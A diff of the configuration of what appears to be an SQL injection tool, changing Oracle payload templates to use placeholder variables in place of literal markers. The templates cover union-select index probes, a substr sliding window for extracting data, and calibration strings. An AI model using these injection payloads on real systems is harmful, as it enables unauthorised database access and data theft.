@@ -176,7 +176,7 @@ from (
             <slidingWindow>
 (
     select
-        'SQLi'||
+        '${LEAD}'||
         substr(
             (${INJECTION}),
             ${INDEX},
@@ -186,13 +186,13 @@ from (
             </slidingWindow>
             <limit> having count(*)between ${LIMIT} and 65536</limit>
             <failsafe>to_char(1337${INDICE}7330%2b1)</failsafe>
-            <calibrator>rpad('%23',1024,'%23')s</calibrator>
+            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')s</calibrator>
             <capacity>3996</capacity>
             <limitBoundary>1</limitBoundary>
         </configuration>
         <normal>
             <indices> union select ${INDICES} from dual</indices>
-            <capacity>(SELECT 'SQLi'||${INDICE}||${CALIBRATOR} FROM dual)</capacity>
+            <capacity>(SELECT '${LEAD}'||${INDICE}||${CALIBRATOR} FROM dual)</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
         <boolean>
